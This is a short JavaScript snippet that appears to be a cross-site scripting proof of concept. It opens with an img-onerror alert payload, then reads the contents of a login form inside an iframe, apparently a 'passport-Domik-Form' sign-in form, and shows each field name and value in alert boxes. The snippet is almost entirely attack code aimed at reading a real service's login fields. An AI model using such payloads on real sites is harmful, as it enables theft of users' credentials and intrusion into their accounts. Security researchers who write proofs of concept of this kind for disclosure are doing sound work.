document.write('<img src="" onerror=alert(1)>')
alert()
var iframeDocument = frame.contentWindow.document;

var formData = new FormData(iframeDocument.querySelector('form.passport-Domik-Form'))
for (const pair of formData.entries()) {
  alert(`${pair[0]}, ${pair[1]}`);
}
